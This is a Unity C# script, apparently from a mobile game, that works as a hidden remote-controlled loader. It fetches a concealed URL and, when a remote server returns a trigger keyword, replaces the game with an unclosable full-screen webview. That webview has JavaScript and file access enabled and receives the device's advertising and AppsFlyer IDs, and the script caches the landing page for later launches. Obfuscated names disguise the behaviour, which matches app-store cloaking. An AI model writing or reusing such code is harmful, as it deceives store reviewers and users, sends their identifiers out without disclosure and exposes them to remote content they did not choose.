using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MegaSuperManager : MonoBehaviour
{
    [SerializeField] private Canvas _loadingCanvas;
    [SerializeField] private List<string> _offerlink;
    private string _idfaData = "";
    private string _collectedLink = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("akajah") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { _idfaData = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("asqwesgshvcb", string.Empty) != string.Empty)
            {
                LoadWebView(PlayerPrefs.GetString("asqwesgshvcb"));
            }
            else
            {
                foreach (string n in _offerlink)
                {
                    _collectedLink += n;
                }
                StartCoroutine(StartWebviewInit());
            }
        }
        else
        {
            Stevcjsd();
        }
    }

    private void Stevcjsd()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Menu");
    }

    private IEnumerator StartWebviewInit()
    {
        using (UnityWebRequest mmxasdas = UnityWebRequest.Get(_collectedLink))
        {

            yield return mmxasdas.SendWebRequest();
            if (mmxasdas.isNetworkError)
            {
                Stevcjsd();
            }
            int timerloader = 7;
            while (PlayerPrefs.GetString("qkwoeqkoaokdao", "") == "" && timerloader > 0)
            {
                yield return new WaitForSeconds(1);
                timerloader--;
            }
            try
            {
                if (mmxasdas.result == UnityWebRequest.Result.Success)
                {
                    if (mmxasdas.downloadHandler.text.Contains("filanchhe"))
                    {

                        try
                        {
                            var subs = mmxasdas.downloadHandler.text.Split('|');
                            LoadWebView(subs[0] + "?idfa=" + _idfaData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("qkwoeqkoaokdao", ""), subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {

                            LoadWebView(mmxasdas.downloadHandler.text + "?idfa=" + _idfaData + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("qkwoeqkoaokdao", ""));
                        }
                    }
                    else
                    {
                        Stevcjsd();
                    }
                }
                else
                {
                    Stevcjsd();
                }
            }
            catch
            {
                Stevcjsd();
            }
        }
    }

    private void LoadWebView(string jijsda, string mvcnma = "", int hues = 70)
    {
        if (_loadingCanvas != null)
        {
            _loadingCanvas.gameObject.SetActive(false);
        }
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetAllowAutoPlay(true);

        UniWebView.SetAllowAutoPlay(true);
        UniWebView.SetAllowInlinePlay(true);
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetEnableKeyboardAvoidance(true);

        var wvparam = gameObject.AddComponent<UniWebView>();
        wvparam.SetAllowFileAccess(true);
        wvparam.SetShowToolbar(false);
        wvparam.SetSupportMultipleWindows(false, true);
        wvparam.SetAllowBackForwardNavigationGestures(true);
        wvparam.SetCalloutEnabled(false);
        wvparam.SetBackButtonEnabled(true);

        wvparam.EmbeddedToolbar.SetBackgroundColor(new Color(0, 0, 0, 0f));
        wvparam.SetToolbarDoneButtonText("");
        switch (mvcnma)
        {
            case "0":
                wvparam.EmbeddedToolbar.Show();
                break;
            default:
                wvparam.EmbeddedToolbar.Hide();
                break;
        }
        wvparam.Frame = new Rect(0, hues, Screen.width, Screen.height - hues * 2);
        wvparam.OnShouldClose += (view) =>
        {
            return false;
        };
        wvparam.SetSupportMultipleWindows(true);
        wvparam.SetAllowBackForwardNavigationGestures(true);
        wvparam.OnMultipleWindowOpened += (view, windowId) =>
        {
            wvparam.EmbeddedToolbar.Show();
        };
        wvparam.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (mvcnma)
            {
                case "0":
                    wvparam.EmbeddedToolbar.Show();
                    break;
                default:
                    wvparam.EmbeddedToolbar.Hide();
                    break;
            }
        };
        wvparam.OnOrientationChanged += (view, orientation) =>
        {
            wvparam.Frame = new Rect(0, hues, Screen.width, Screen.height - hues);
        };

        wvparam.OnLoadingErrorReceived += (view, code, message, payload) =>
        {
            if (payload.Extra != null &&
                payload.Extra.TryGetValue(UniWebViewNativeResultPayload.ExtraFailingURLKey, out var value))
            {
                var url = value as string;

                wvparam.Load(url);
            }
        };
        wvparam.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("asqwesgshvcb", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("asqwesgshvcb", url);
            }
        };
        wvparam.Load(jijsda);
        wvparam.Show();
    }
}
